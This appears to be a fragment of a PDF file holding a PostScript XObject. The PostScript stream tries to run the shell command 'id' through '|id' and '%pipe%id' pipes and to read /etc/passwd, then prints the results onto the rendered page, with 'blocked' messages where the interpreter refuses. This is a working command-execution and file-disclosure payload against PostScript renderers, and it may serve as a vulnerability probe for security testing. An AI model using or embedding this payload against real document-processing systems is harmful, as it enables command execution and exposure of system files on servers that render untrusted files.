4 0 obj
<< /Type /XObject /Subtype /PS /Length 733 >>
stream
%!PS-Adobe-3.0
/Courier findfont 11 scalefont setfont
/y 505 def
/nl { /y y 13 sub def } def
/line { 20 y moveto show nl } def

(== whoami/id via |-pipe ==) line
{ /p (|id) (r) file def /b 400 string def
  { p b readline { 20 y moveto show nl }{ pop exit } ifelse } loop
  p closefile
} stopped { (  blocked: |id) line } if

(== id via %pipe% ==) line
{ /q (%pipe%id) (r) file def /c 400 string def
  { q c readline { 20 y moveto show nl }{ pop exit } ifelse } loop
  q closefile
} stopped { (  blocked: %pipe%id) line } if

(== /etc/passwd ==) line
{ /f (/etc/passwd) (r) file def /d 400 string def
  { f d readline { 20 y moveto show nl }{ pop exit } ifelse } loop
  f closefile
} stopped { (  blocked: /etc/passwd read) line } if
endstream
endobj
